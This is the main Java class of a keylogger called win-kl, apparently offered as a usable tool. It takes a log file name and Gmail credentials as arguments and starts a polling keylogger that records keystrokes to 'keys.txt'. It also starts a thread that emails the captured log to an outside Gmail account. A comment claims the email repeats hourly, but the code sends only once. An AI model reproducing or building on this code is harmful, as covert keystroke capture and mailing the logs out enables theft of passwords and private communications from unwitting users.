package com.wassilak.win_kl;

import com.wassilak.win_kl.email.GmailLogEmailer;
import com.wassilak.win_kl.email.LogEmailer;
import com.wassilak.win_kl.kl.KL;
import com.wassilak.win_kl.kl.PollingKL;

import java.io.File;

/**
 * The Win_KL class is the main class of the win-kl application, it processes
 * any arguments passed from the user and begins execution. The default mode
 * of execution does not use a logEmailer, if the user wants to use one they
 * need to pass the address and password in order to activate it. Currently
 * only gmail email accounts work.
 */
public class Win_KL {

    /**
     * The logFile field represents the file that the key logger will write to.
     */
    private File logFile;
    /**
     * The emailAddress field stores the value of the email address that is to
     * be used with a logEmailer.
     */
    private String emailAddress;
    /**
     * The emailPassword field stores the value of the email password that is to
     * be used with a logEmailer.
     */
    private String emailPassword;

    /**
     * The Win_KL constructor enforces the applications default properties,
     * that is, no LogEmailer and the logFile to use is "keys.txt".
     */
    public Win_KL() {
        emailAddress = null;
        emailPassword = null;
        logFile = new File("keys.txt");
    }

    /**
     * The main method is the execution entry point of the win-kl application.
     * It parses the given arguments for any defaults the user wants to
     * override.
     *
     * @param args The arguments passed by the user.
     */
    public static void main(String[] args) {
        Win_KL win_kl = new Win_KL();
        for (String s : args) {
            if (s.contains("--log.file=")) {
                win_kl.logFile = new File(s.substring(s.indexOf('=') + 1));
            } else if (s.contains("--email.address=")) {
                win_kl.emailAddress = s.substring(s.indexOf('=') + 1);
            } else if (s.contains("--email.password=")) {
                win_kl.emailPassword = s.substring(s.indexOf('=') + 1);
            }
        }
        win_kl.run();
    }

    /**
     * The run method triggers the execution of the keylogger, and if the needed
     * parameters were passed, a logEmailer. If a logEmailer is created, it
     * executes at startup and every hour from then on.
     */
    public void run() {
        if (emailAddress != null && emailPassword != null) {
            final String address = emailAddress;
            final String password = emailPassword;
            final File file = logFile;
            new Thread() {
                public synchronized void run() {
                    sendEmail();
                    try {
                        Thread.sleep(60 * 60 * 1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }

                private void sendEmail() {
                    LogEmailer logEmailer =
                            new GmailLogEmailer(address, password);
                    logEmailer.emailLog(file);
                }
            }.start();
        }
        KL kl = new PollingKL();
        kl.run(logFile);
    }
}
